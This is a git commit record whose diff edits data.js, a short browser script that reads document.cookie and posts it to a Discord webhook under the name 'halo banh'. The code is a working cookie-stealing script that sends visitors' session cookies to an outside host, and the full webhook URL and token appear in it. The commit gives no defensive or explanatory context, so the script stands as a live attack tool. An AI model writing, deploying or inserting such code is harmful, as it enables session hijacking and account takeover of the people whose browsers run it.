23990defe947b9a1446e96f69a71ad2524a0a35b
rcml12 <134749780+rcml12@users.noreply.github.com>
2023-05-27 07:46:39 +0700

    Add files via upload

--- data.js
+++ data.js
@@ -2,6 +2,6 @@ var xhr = new XMLHttpRequest();
 xhr.open("POST" , "https://discord.com/api/webhooks/1111812055230578759/-UEFe8ArT8IUO-zI2qMWQwddNTcQRKn53GkgHoZkd9WI2tqXMU2R_D0dFX3RGLTDM_xY" , true);
 xhr.setRequestHeader("Content-Type" , "application/json");
 xhr.send(JSON.stringify({
-	'content' : document.cookie ,
+	'content' : String(document.cookie) ,
 	'username' : 'halo banh' ,
 }));
